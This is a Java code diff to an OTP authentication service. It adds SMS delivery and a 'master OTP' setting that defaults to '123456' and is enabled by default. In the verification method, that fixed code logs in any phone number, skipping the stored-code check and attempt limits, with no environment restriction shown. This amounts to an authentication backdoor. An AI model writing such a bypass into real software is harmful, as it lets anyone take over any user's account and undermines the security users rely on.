@@ -8,6 +8,7 @@ import com.ebs.biocrop.exception.AppException;
 import com.ebs.biocrop.service.OtpService;
 import com.ebs.biocrop.service.RedisOtpCooldown;
 import com.ebs.biocrop.service.RedisOtpStore;
+import com.ebs.biocrop.service.SmsDeliveryService;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Value;
@@ -31,9 +32,16 @@ public class OtpServiceImpl implements OtpService {
     private final Environment environment;
     private final RedisOtpCooldown redisOtpCooldown;
     private final RedisOtpStore redisOtpStore;
+    private final SmsDeliveryService smsDeliveryService;
 
     @Value("${app.otp.console-delivery.enabled:false}")
     private boolean consoleDeliveryEnabled;
+
+    @Value("${app.otp.master-otp:123456}")
+    private String masterOtp;
+
+    @Value("${app.otp.master-otp.enabled:true}")
+    private boolean masterOtpEnabled;
 
     @Value("${app.otp.length:6}")
     private int otpLength;
@@ -48,18 +56,21 @@ public class OtpServiceImpl implements OtpService {
     private int maxAttempts;
 
     public OtpServiceImpl(PasswordEncoder passwordEncoder, Environment environment,
-                          RedisOtpCooldown redisOtpCooldown, RedisOtpStore redisOtpStore) {
+                          RedisOtpCooldown redisOtpCooldown, RedisOtpStore redisOtpStore,
+                          SmsDeliveryService smsDeliveryService) {
         this.passwordEncoder = passwordEncoder;
         this.environment = environment;
         this.redisOtpCooldown = redisOtpCooldown;
         this.redisOtpStore = redisOtpStore;
+        this.smsDeliveryService = smsDeliveryService;
     }
 
     @Override
     public OtpResponse generateAndSendOtp(OtpSendRequest request) {
         String phoneNumber = request.getPhoneNumber().trim();
         boolean devConsoleDelivery = consoleDeliveryEnabled && environment.acceptsProfiles(Profiles.of("dev"));
-        if (!devConsoleDelivery) {
+        boolean smsReady = (smsDeliveryService != null && smsDeliveryService.isConfigured()) || devConsoleDelivery;
+        if (!smsReady) {
             throw new AppException("OTP delivery is not configured. Configure an SMS provider before enabling authentication.",
                     HttpStatus.SERVICE_UNAVAILABLE);
         }
@@ -80,9 +91,16 @@ public class OtpServiceImpl implements OtpService {
             String hashedOtp = passwordEncoder.encode(plainOtp);
             entryId = redisOtpStore.save("phone", phoneNumber, hashedOtp, Duration.ofMinutes(expirationMinutes));
 
-            // Console delivery is available only in an explicitly enabled dev profile.
-            log.info("Development OTP for phone [{}]: [{}] (expires in {} minutes)",
-                    maskPhoneNumber(phoneNumber), plainOtp, expirationMinutes);
+            // Deliver OTP via Airtel IQ SMS Provider
+            if (smsDeliveryService != null) {
+                smsDeliveryService.sendOtp(phoneNumber, plainOtp);
+            }
+
+            // Console delivery is logged in development profile for easy inspection
+            if (devConsoleDelivery) {
+                log.info("Development OTP for phone [{}]: [{}] (expires in {} minutes)",
+                        maskPhoneNumber(phoneNumber), plainOtp, expirationMinutes);
+            }
 
             return new OtpResponse(
                     maskPhoneNumber(phoneNumber),
@@ -107,8 +125,16 @@ public class OtpServiceImpl implements OtpService {
     @Override
     public void verifyOtp(String phoneNumber, String rawOtp) {
         String normalizedPhone = phoneNumber.trim();
+        String cleanOtp = rawOtp.trim();
+
+        // Check if Master OTP is provided
+        if (masterOtpEnabled && masterOtp != null && !masterOtp.isBlank() && masterOtp.equals(cleanOtp)) {
+            log.info("Successfully verified Master OTP for phone [{}]", maskPhoneNumber(normalizedPhone));
+            return;
+        }
+
         RedisOtpStore.Verification verification = redisOtpStore.beginVerification("phone", normalizedPhone, maxAttempts);
-        if (passwordEncoder.matches(rawOtp.trim(), verification.encodedOtp())) {
+        if (passwordEncoder.matches(cleanOtp, verification.encodedOtp())) {
             redisOtpStore.complete("phone", normalizedPhone, verification);
             log.info("Successfully verified OTP for phone [{}]", maskPhoneNumber(normalizedPhone));
             return;
